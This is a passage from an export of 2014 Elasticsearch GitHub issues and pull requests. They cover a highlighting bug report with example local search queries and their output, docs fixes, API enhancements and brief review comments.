</comment><comment author="clintongormley" created="2014-08-08T17:00:14Z" id="51629376">@ajhalani No you're right. That's what it does today.  I'm just wondering if that is correct.  I'm not sure I understand why it rounds up, not down.
</comment><comment author="ajhalani" created="2014-09-25T18:52:49Z" id="56865733">any plans to pursue a discussion and make decision on this ?? 
</comment><comment author="clintongormley" created="2014-11-10T15:07:38Z" id="62396462">Closed in favour of #8424
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>[DOCS] Added section describing how to return only agg results</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7202</link><project id="" key="" /><description>Closes #5875
</description><key id="39814055">7202</key><summary>[DOCS] Added section describing how to return only agg results</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/colings86/following{/other_user}', u'events_url': u'https://api.github.com/users/colings86/events{/privacy}', u'organizations_url': u'https://api.github.com/users/colings86/orgs', u'url': u'https://api.github.com/users/colings86', u'gists_url': u'https://api.github.com/users/colings86/gists{/gist_id}', u'html_url': u'https://github.com/colings86', u'subscriptions_url': u'https://api.github.com/users/colings86/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/236731?v=4', u'repos_url': u'https://api.github.com/users/colings86/repos', u'received_events_url': u'https://api.github.com/users/colings86/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/colings86/starred{/owner}{/repo}', u'site_admin': False, u'login': u'colings86', u'type': u'User', u'id': 236731, u'followers_url': u'https://api.github.com/users/colings86/followers'}</assignee><reporter username="">colings86</reporter><labels /><created>2014-08-08T11:29:47Z</created><updated>2014-08-21T15:10:19Z</updated><resolved>2014-08-11T10:33:17Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-08T14:32:58Z" id="51609767">LGTM
</comment><comment author="colings86" created="2014-08-11T10:33:17Z" id="51764264">Pushed to master and 1.x
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Add index, type and id to ExplainResponse</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7201</link><project id="" key="" /><description>Index, type and id were returned as part of the REST explain api response, but not through java api. That info was read out of the request, relying on the fact that the index would get overridden with the concrete one within that same request instance.
</description><key id="39810757">7201</key><summary>Add index, type and id to ExplainResponse</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/javanna/following{/other_user}', u'events_url': u'https://api.github.com/users/javanna/events{/privacy}', u'organizations_url': u'https://api.github.com/users/javanna/orgs', u'url': u'https://api.github.com/users/javanna', u'gists_url': u'https://api.github.com/users/javanna/gists{/gist_id}', u'html_url': u'https://github.com/javanna', u'subscriptions_url': u'https://api.github.com/users/javanna/subscriptions', u'avatar_url': u'https://avatars1.githubusercontent.com/u/832460?v=4', u'repos_url': u'https://api.github.com/users/javanna/repos', u'received_events_url': u'https://api.github.com/users/javanna/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/javanna/starred{/owner}{/repo}', u'site_admin': False, u'login': u'javanna', u'type': u'User', u'id': 832460, u'followers_url': u'https://api.github.com/users/javanna/followers'}</assignee><reporter username="">javanna</reporter><labels><label>:Java API</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T10:35:03Z</created><updated>2015-06-07T12:28:02Z</updated><resolved>2014-08-08T10:52:33Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="martijnvg" created="2014-08-08T10:50:04Z" id="51587419">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Highlight fragment_size doesn't work with particular query_string</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7200</link><project id="" key="" /><description>In my use-case, I have documents indexed in ES with two fields, `metadata.path` and `metadata.text`. The path is just a file path and the text is a big chunk of text which is the content of the file. 

So, I do multiple search on this fields and I have a bug with highlighting. JSON returned by ES contains a highlighted field `metadata.text` which is bigger than `fragment_size`.

I succeed in minimizing the query to show you an example :  

``` bash
curl -XPOST 'localhost:9200/company_53e1e4383e808ea8077bcacb/_search?pretty' -d '
{
  "fields": [],
  "query": {
    "query_string": {
      "query": "guide astreinte aer",
      "default_operator": "AND"
    }
  },
  "highlight": {
    "pre_tags": ["&lt;span&gt;"],
    "post_tags": ["&lt;/span&gt;"],
    "encoder": "html",
    "fields": {
      "metadata.*": {
        "number_of_fragments" : 1,
        "fragment_size": 200
      }
    }
  }
}'
```

Result : 

``` json
{
  "took" : 11,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 0.57094264,
    "hits" : [ {
      "_index" : "company_53e1e4383e808ea8077bcacb",
      "_type" : "5252ce4ce4cfcd16f55cfa3c",
      "_id" : "53e20d353dc80bbf7e8fe5c0-5252ce4ce4cfcd16f55cfa3c",
      "_score" : 0.57094264,
      "highlight" : {
        "metadata.text" : [ " sur un &#233;v&#233;nement, &lt;span&gt;l&#8217;AER&lt;/span&gt; en est responsable et doit s&#8217;assurer que tout se d&#233;roule correctement aussi bien au niveau ambiance qu&#8217;au niveau mat&#233;riel. 1. La garde ou &lt;span&gt;astreinte&lt;/span&gt; &lt;span&gt;L&#8217;AER&lt;/span&gt; de garde ou &lt;span&gt;d&#8217;astreinte&lt;/span&gt; est responsable des locaux. Il a pour mission l&#8217;accompagnement des &#233;tudiants. Il doit passer dans les diff&#233;rentes salles et proposer son accompagnement. Il peut &#233;galement &#234;tre sollicit&#233; ponctu
ellement par l&#8217;&#233;quipe p&#233;dagogique ou l&#8217;administration pour diverses t&#226;ches manuelles ou actions pr&#233;cises. Il peut &#234;tre &#233;galement responsable de l&#8217;ouverture ou de la fermeture de l&#8217;&#233;cole. Se reporter &#224; la documentation pour plus de d&#233;tails. 2. Les soutenances Les soutenances sont l&#8217;occasion pour &lt;span&gt;l&#8217;AER&lt;/span&gt; d&#8217;&#233;valuer les &#233;tudiants. Le bar&#232;me de notation doit &#234;tre suivit &#224; la lettre. Comme ces bar&#232;mes sont parfois un peu flous, une r&#233;union de concertation entre les diff&#233;rents &lt;span&gt;AERs&lt;/span&gt; et le responsable du module correspondant est n&#233;cessaire au pr&#233;alable afin d&#8217;avoir une notation la plus impartiale possible. Cet &#233;v&#233;nement est l&#8217;un de ceux o&#249; le suivi de l&#8217;&#233;tudiant est le plus fort. Ainsi, il est important de faire remonter par email au responsable de module toute remarque constructive concernant des &#233;tudiants. 3. Les TPs Les TPs sont le second type d&#8217;&#233;v&#233;nement o&#249; le suivi de l&#8217;&#233;tudiant est le plus fort. Pendant un TP, &lt;span&gt;l&#8217;AER&lt;/span&gt; est debout et circule entre les diff&#233;rents &#233;tudiants. Il r&#233;pond aux diff&#233;rentes questions et doit s&#8217;assurer que tous les &#233;tudiants travaillent bien. Si un &#233;tudiant ne pose pas de questions, c&#8217;est &#224; &lt;span&gt;l&#8217;AER&lt;/span&gt; de lui poser des questions. De m&#234;me que pour les soutenances, toute remarque constructive &#224; propos d&#8217;un &#233;tudiant doit &#234;tre remont&#233;e au responsable du module concern&#233;. &lt;span&gt;Guide&lt;/span&gt; de &lt;span&gt;l&#8217;AER&lt;/span&gt; 2014 6 4. Les conf&#233;rences Il existe trois types de conf&#233;rences. Comme cet &#233;v&#233;nement fait intervenir des gens externes &#224; Epitech, la documentation doit &#234;tre suivie encore plus scrupuleusement que pour les autres &#233;v&#233;nements. Exception faite pour les conf&#233;rences retransmises, un compte-rendu d&#233;taill&#233; doit &#234;tre fait pour chaque conf&#233;rence. a. Conf&#233;rences en Amphi Pour les conf&#233;rences en amphi, deux &lt;span&gt;AERs&lt;/span&gt; sont mobilis&#233;s : le premier assure l&#8217;accueil des visiteurs devant le b&#226;timent de l&#8217;ISEG et les redirige vers l&#8217;amphi, une demi-heure avant et une demi-\nheure apr&#232;s le d&#233;but de l&#8217;&#233;v&#233;nement. Il s&#8217;occupe &#233;galement de la fermeture de la grille de l&#8217;ISEG. Le second s&#8217;occupe de l&#8217;amphi : il veille &#224; ce que tout se d&#233;roule correctement en r&#233;pondant aux besoins de l&#8217;intervenant (micros, identifiants WIFI test&#233;s au pr&#233;alable, feutres, cl&#233;s de l&#8217;amphi, tokens pour les &#233;tudiant, &#8230;). Il s&#8217;occupe &#233;galement de canaliser les &#233;tudiants : il les rappelle &#224; l&#8217;ordre si ces derniers emp&#234;
chent le bon d&#233;roulement de la conf&#233;rence et ou manquent de respect aux intervenants (ne suivent pas la conf&#233;rence, font du bruit, &#8230;). b. Conf&#233;rences au Bayard Certaines conf&#233;rences se d&#233;roulent en salle 005. Dans ce cas l&#224;, un seul &lt;span&gt;AER&lt;/span&gt; est n&#233;cessaire. Il doit &#234;tre pr&#233;sent avant la fermeture du b&#226;timent et d&#232;s l&#8217;arriv&#233;e des intervenants : il est responsable des locaux et ne doit jamais les laisser sans une surveillance interne &#224; l&#8217;&#233;quipe d&#8217;Epitech. L&#8217;accueil s&#8217;effectue par la porte arri&#232;re du b&#226;timent (c&#244;t&#233; rue d&#8217;Essling). La cl&#233; du b&#226;timent doit d&#8217;ailleurs &#234;tre r&#233;cup&#233;r&#233;e avant la fermeture du Bayard et ramen&#233;e le lendemain matin avant 12h00. c. Conf&#233;rences retransmises Certaines conf&#233;rences sont retransmises depuis Paris via le live Epitech sur Dailymotion. &lt;span&gt;L&#8217;AER&lt;/span&gt; doit s&#8217;occuper de brancher le PC de conf&#233;rence au r&#233;troprojecteur et &#224; l&#8217;ampli. Il doit s&#8217;assurer que la conf&#233;rence se d&#233;roule correctement. D&#8217;une mani&#232;re g&#233;n&#233;rale, reportez-vous &#224; la documentation et pensez au compte-rendu. &lt;span&gt;Guide&lt;/span&gt; de &lt;span&gt;l&#8217;AER&lt;/span&gt; 2014 7 5. Web@cad&#233;mie La Web@cad&#233;mie (W@C) est un partenariat entre Zup de Co. et la r&#233;gion Rh&#244;ne-Alpes (entre autres). Epitech est missionn&#233; pour former en web des &#233;tudiants r&#233;pondant &#224; certains crit&#232;res. L&#8217;intervention des &lt;span&gt;AERs&lt;/span&gt; est assez pr&#233;cise : au m&#234;me titre qu&#8217;un TP &lt;span&gt;l&#8217;AER&lt;/span&gt; doit circuler au milieu des &#233;tudiants et les accompagner dans leur d&#233;marche. La connaissance technique en technologies web n&#8217;est pas obligatoire : de m&#234;me que pour les &#233;tudiants d&#8217;Epitech, vous ne devez pas leur apporter une r&#233;ponse mais les accompagner dans leur r&#233;flexion. Il est important de faire signer la feuille d&#8217;&#233;mergement le matin et l&#8217;apr&#232;s-midi par les &#233;tudiants et de noter leurs &#233;ventuels retards sans exception en plus de leur distribuer les tokens. &lt;span&gt;L&#8217;AER&lt;/span&gt; responsable de la W@C le vendredi apr&#232;s-midi doit emmener la feuille d&#8217;&#233;mergement compl&#233;t&#233;e (mention ABS lors d&#8217;une absence) aupr&#232;s de Prisca qui donnera la feuille de la semaine suivante. 6. Les Examens Est consid&#233;r&#233; comme un examen tout &#233;v&#233;nement o&#249; l&#8217;&#233;tudiant est amen&#233; &#224; &#234;tre &#233;valu&#233; par le biais de son ordinateur. La proc&#233;dure d&#8217;examen est stricte et doit &#234;tre suivie avec impartialit&#233; et pr&#233;cision : aucun traitement de faveur ne doit &#234;tre fait. Pendant l&#8217;examen, &lt;span&gt;l&#8217;AER&lt;/span&gt; circule entre les rangs en surveillant les &#233;crans des &#233;tudiants afin d&#8217;emp&#234;cher la triche. En plus des r&#232;gles de base des salles machines, les r&#232;gles d&#8217;examens s&#8217;appliquent. Toute suspicion de triche doit &#234;tre report&#233;e au responsable du module correspondant imm&#233;diatement si possible ou par email &#224; la fin de l&#8217;examen. Aucun bruit n&#8217;est tol&#233;r&#233; pendant l&#8217;examen. Si un portable sonne, la rang&#233;e enti&#232;re doit sortir de la salle. Les &#233;tudiants peuvent sortir &#224; partir des 2&amp;#x2F;3 du temps en laissant son pc sur place jusqu&#8217;&#224; la fin de l&#8217;examen (une fois l&#8217;heure de fin d&#233;pass&#233;e et le dernier &#233;tudiant sorti). 7. La r&#233;union &lt;span&gt;AER&lt;/span&gt; hebdomadaire La r&#233;union &lt;span&gt;AER&lt;/span&gt; hebdomadaire est planifi&#233;e de mani&#232;re r&#233;currente chaque semaine. La pr&#233;sence de chaque &lt;span&gt;AER&lt;/span&gt; est indispensable. Elle permet l&#8217;organisation et la coh&#233;sion du groupe. C&#8217;est &#233;galement pendant cette r&#233;union qu&#8217;une r&#233;elle communication a lieu entre l&#8217;&#233;quipe p&#233;dagogique et les &lt;span&gt;AERs&lt;/span&gt; : c&#8217;est l&#8217;occasion de faire remonter tout ce qui nous semble important aussi bien sur le point p&#233;dagogique que mat&#233;riel ou bien m&#234;me humain. &lt;span&gt;Guide&lt;/span&gt; de &lt;span&gt;l&#8217;AER&lt;/span&gt; 2014 8 III. Interlocuteurs Tout au long de la mission de &lt;span&gt;l&#8217;AER&lt;/span&gt;, ce dernier traite avec plusieurs interlocuteurs diff&#233;rents. Les principaux sont l&#8217;&#233;quipe p&#233;dagogique dans laquelle un ou plusieurs r&#233;f&#233;rents seront d&#233;sign&#233;s (responsable des &lt;span&gt;AERs&lt;/span&gt;). Il est important de bien v&#233;rifier que l&#8217;ont s&#8217;adresse &#224; la bonne personne lors d&#8217;un contact : tout le monde gagne du temps. &#61623; Pour une question concernant le travail de &lt;span&gt;l&#8217;AER&lt;/span&gt; ou une pr&#233;cision &#224; ce propos, le r&#233;f&#233;rent &lt;span&gt;AER&lt;/span&gt; de l&#8217;&#233;quipe p&#233;dagogique est l&#8217;interlocuteur privil&#233;gi&#233;. &#61623; Pour une question &#224; propos d&#8217;un module, d&#8217;un cours, d&#8217;une soutenance ou d&#8217;un TP, le bon interlocuteur est le responsable du module (v&#233;rifier sur l&#8217;intra). &#61623; Pour une question d&#8217;ordre administratif (informations sur la s&#233;curit&#233; sociale, sur la scolarit&#233;, &#8230;), se r&#233;f&#233;rer &#224; l&#8217;administration Il se peut que la question ne vous concerne pas mais &#233;mane d&#8217;un &#233;tudiant. Dans ce cas l&#224;, &lt;span&gt;l&#8217;AER&lt;/span&gt; doit rediriger l&#8217;&#233;tudiant vers le bon int
erlocuteur : il ne doit pas se renseigner pour lui. Pour l&#8217;aspect technique, il se peut que &lt;span&gt;l&#8217;AER&lt;/span&gt; doive traiter avec le bocal par t&#233;l&#233;phone. Dans ce cas, il faut bien penser &#224; se pr&#233;senter (Nom, Lab &lt;span&gt;AER&lt;/span&gt; Epitech Lyon). (Num&#233;ro 0140 depuis un poste de l&#8217;&#233;cole). Lors d&#8217;un incident grave (feu, vol, pr&#233;sence d&#8217;un individu agressif dans les locaux, &#8230;), il faut imp&#233;rativement se mettre en s&#233;curit&#233; avec si possible les &#233;tudiants pr&#233;sents et contacter d&#8217;u
rgence des secours (police, pompiers, SAMU, &#8230;) et le responsable des &lt;span&gt;AERs&lt;/span&gt; sur son t&#233;l&#233;phone personnel s&#8217;il n&#8217;est pas pr&#233;sent. D&#8217;une mani&#232;re g&#233;n&#233;rale, la documentation indique les num&#233;ros des principaux interlocuteurs. S&#8217;y rep
orter pour davantage d&#8217;informations. &lt;span&gt;Guide&lt;/span&gt; de &lt;span&gt;l&#8217;AER&lt;/span&gt; 2014 9 IV. En conclusion D&#8217;une mani&#232;re g&#233;n&#233;rale : &#61623; &lt;span&gt;L&#8217;AER&lt;/span&gt; est au service de l&#8217;&#233;quipe d&#8217;Epitech &#61623; Il doit &#234;tre actif et pr&#233;sent &#61623; Il accompagne les 
&#233;tudiants &#61623; Il fait du reporting (faire remonter tout &#233;l&#233;ment important aux responsables sup&#233;rieurs) &#61623; Il est impartial et n&#8217;abuse pas de sa position. &#61623; Il donne l&#8217;exemple : il est irr&#233;prochable et propre &#61623; Les &#233;v&#233;nements de &lt;span&gt;l&#8217;AER&lt;/
span&gt; ne sont pas le moment pour travailler sur ses projets persos &#61623; Il se reporte &#224; la documentation pour &#234;tre s&#251;r d&#8217;agir comme il faut &#61623; Si la documentation ne le renseigne pas, il se reporte au responsable des &lt;span&gt;AERs&lt;/span&gt;. L&#233;gend
e Urbaine " ],
        "metadata.path" : [ "&amp;#x2F;{Epitech.} - Lyon &lt;span&gt;AER&lt;/span&gt;&amp;#x2F;Procedures - Reglements&amp;#x2F;Guide_&lt;span&gt;AER&lt;/span&gt;.PDF" ]
      }
    } ]
  }
}
```

To prove that the problem isn't the doc, I have tried with a match_phrase, the same query string and the same highlight : 

``` bash
curl -XPOST 'localhost:9200/company_53e1e4383e808ea8077bcacb/_search?pretty' -d '
{
  "fields": [],
  "query": {
    "match_phrase": {
      "_all": {
        "query": "guide astreinte aer",
        "slop": 50,
        "analyzer": "query"
      }
    }
  },
  "highlight": {
    "pre_tags": ["&lt;span&gt;"],
    "post_tags": ["&lt;/span&gt;"],
    "encoder": "html",
    "fields": {
      "metadata.*": {
        "number_of_fragments" : 1,
        "fragment_size": 200
      }
    }
  }
}'
```

Result : 

``` json
{
  "took" : 12,
  "timed_out" : false,
  "_shards" : {
    "total" : 5,
    "successful" : 5,
    "failed" : 0
  },
  "hits" : {
    "total" : 1,
    "max_score" : 0.109629005,
    "hits" : [ {
      "_index" : "company_53e1e4383e808ea8077bcacb",
      "_type" : "5252ce4ce4cfcd16f55cfa3c",
      "_id" : "53e20d353dc80bbf7e8fe5c0-5252ce4ce4cfcd16f55cfa3c",
      "_score" : 0.109629005,
      "highlight" : {
        "metadata.text" : [ " des r&#233;visions Date Auteur Sections Commentaire 02&amp;#x2F;07&amp;#x2F;2014 Mathieu Ville -\nville_m Toutes Premi&#232;re r&#233;vision &lt;span&gt;Guide&lt;/span&gt; de &lt;span&gt;l&#8217;AER&lt;/span&gt; 2014 3 Sommaire I. Introduction" ]
      }
    } ]
  }
}
```

Do you have clues about this bug ? I will try to reproduce the bug in a complete shell script but it's hard.
</description><key id="39808895">7200</key><summary>Highlight fragment_size doesn't work with particular query_string</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">Quentin01</reporter><labels><label>:Highlighting</label><label>bug</label></labels><created>2014-08-08T10:05:35Z</created><updated>2016-11-24T18:54:24Z</updated><resolved>2016-11-24T18:54:24Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="Quentin01" created="2014-09-19T14:20:41Z" id="56183281">Anyone have the same problem or have a fix ?
</comment><comment author="clintongormley" created="2014-09-25T20:00:15Z" id="56874855">Hi @Quentin01 

Highlighting bugs are hard :(  We will have a big cleanup of the highlighters in the future. In the meantime, I suggest you try one of the other highlighters (eg fast vector or postings).  You may have better success there.
</comment><comment author="clintongormley" created="2016-11-24T18:54:24Z" id="262832023">Full recreation not provided. Closing in favour of #7944</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Parse synonyms with the same analysis chain</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7199</link><project id="" key="" /><description>Synonyms are currently tokenized with the whitespace tokenizer.  Really they should be tokenized with whatever tokenizer and token filters appear before it in the chain (ie the same analysis chain that is used on the text).
</description><key id="39803589">7199</key><summary>Parse synonyms with the same analysis chain</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/johtani/following{/other_user}', u'events_url': u'https://api.github.com/users/johtani/events{/privacy}', u'organizations_url': u'https://api.github.com/users/johtani/orgs', u'url': u'https://api.github.com/users/johtani', u'gists_url': u'https://api.github.com/users/johtani/gists{/gist_id}', u'html_url': u'https://github.com/johtani', u'subscriptions_url': u'https://api.github.com/users/johtani/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/1142449?v=4', u'repos_url': u'https://api.github.com/users/johtani/repos', u'received_events_url': u'https://api.github.com/users/johtani/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/johtani/starred{/owner}{/repo}', u'site_admin': False, u'login': u'johtani', u'type': u'User', u'id': 1142449, u'followers_url': u'https://api.github.com/users/johtani/followers'}</assignee><reporter username="">clintongormley</reporter><labels><label>:Analysis</label><label>enhancement</label></labels><created>2014-08-08T08:45:59Z</created><updated>2017-06-20T12:50:34Z</updated><resolved>2017-06-20T12:50:34Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Test: Improved CLI testing infrastructure</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7198</link><project id="" key="" /><description>Added a LoggingTerminal class to the infrastructure, which can be used
in tests, to make sure that CLI commands write out the right data
</description><key id="39803507">7198</key><summary>Test: Improved CLI testing infrastructure</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">spinscale</reporter><labels><label>test</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T08:44:32Z</created><updated>2015-06-07T11:46:37Z</updated><resolved>2014-08-11T07:55:45Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="uboness" created="2014-08-09T01:54:51Z" id="51673883">small comment, other than that... LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix BytesStreamInput(BytesReference) ctor with nonzero offset</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7197</link><project id="" key="" /><description>I renamed 'count' to 'end', since thats what it actually means for this class.

ctor 1 was broken, only worked if offset is zero.
ctor 2 had unnecessary leniency.
</description><key id="39797703">7197</key><summary>Fix BytesStreamInput(BytesReference) ctor with nonzero offset</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">rmuir</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-08T07:12:52Z</created><updated>2015-06-07T19:11:13Z</updated><resolved>2014-08-08T07:32:54Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-08T07:14:09Z" id="51570260">LGTM
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>post template conflicts with template file in config/templates</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7196</link><project id="" key="" /><description>There is a template in ESPATH/config/templates/test.json in the master node including a template named "test"
And then I post a new template using POST /_template/test

I could get the test template using  GET _template/test, it is the same as what i posted.
However , ES use ESPATH/config/templates/test.json  when new index is created.

this action would make much confusing.
</description><key id="39788122">7196</key><summary>post template conflicts with template file in config/templates</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">childe</reporter><labels /><created>2014-08-08T02:53:57Z</created><updated>2014-09-28T03:16:40Z</updated><resolved>2014-09-28T03:16:40Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="childe" created="2014-09-28T03:16:40Z" id="57073505">since there is also a default template with template:"*" .  they are merged and that is the root cause.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Fix minor typo in readme</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7195</link><project id="" key="" /><description /><key id="39777166">7195</key><summary>Fix minor typo in readme</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">philfreo</reporter><labels><label>docs</label></labels><created>2014-08-07T23:00:38Z</created><updated>2014-08-18T10:59:21Z</updated><resolved>2014-08-18T10:59:21Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-08T07:03:01Z" id="51569637">Hi @philfreo 

Thanks for the fix. Could I ask you to sign the CLA so that I can get it merged in?
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="philfreo" created="2014-08-08T15:22:15Z" id="51616174">lol sure - done!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Include # of shards information in nodes api output</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7194</link><project id="" key="" /><description>Routing table (http://localhost:9200/_cluster/state/routing_table?pretty) provides a nice view of how shards are allocated grouped by indices.  We have use cases in the field where admins would like to have a rest json api (eg. nodes info or node stats) returning # of shard information grouped by nodes (similar to what cat allocation provides) but in json format, eg. # of primary shards per node, # of replicas per node, total # of shards per node, etc..
</description><key id="39771858">7194</key><summary>Include # of shards information in nodes api output</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">ppf2</reporter><labels><label>:CAT API</label><label>adoptme</label><label>enhancement</label><label>low hanging fruit</label></labels><created>2014-08-07T21:47:04Z</created><updated>2016-11-25T18:27:41Z</updated><resolved>2016-11-25T18:27:41Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2016-11-25T18:27:41Z" id="263008327">This is available with `GET _cat/allocation?format=json`</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Updated the community clients for Kafka Consumer in Integration Page</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7193</link><project id="" key="" /><description>I got an email from Clinton Gormley to update the details on the "Kafka Consumer for ElasticSearch" in Community support clients integration page and I did it.

Details of the "Kafka Consumer for ElasticSearch" can be found here: https://github.com/reachkrishnaraj/kafka-elasticsearch-standalone-consumer
</description><key id="39769793">7193</key><summary>Updated the community clients for Kafka Consumer in Integration Page</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">reachkrishnaraj</reporter><labels><label>docs</label></labels><created>2014-08-07T21:23:00Z</created><updated>2014-08-18T10:58:13Z</updated><resolved>2014-08-18T10:58:13Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Update repositories.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7192</link><project id="" key="" /><description>Added apt-get update to the commands for clarity.
</description><key id="39741896">7192</key><summary>Update repositories.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">DeanPoulin</reporter><labels><label>docs</label></labels><created>2014-08-07T16:15:52Z</created><updated>2014-08-18T10:57:36Z</updated><resolved>2014-08-18T10:57:36Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-08-07T18:05:42Z" id="51509058">Hi @DeanPoulin 

thanks for the PR. please could I ask you to sign our CLA so that I can merge it in?
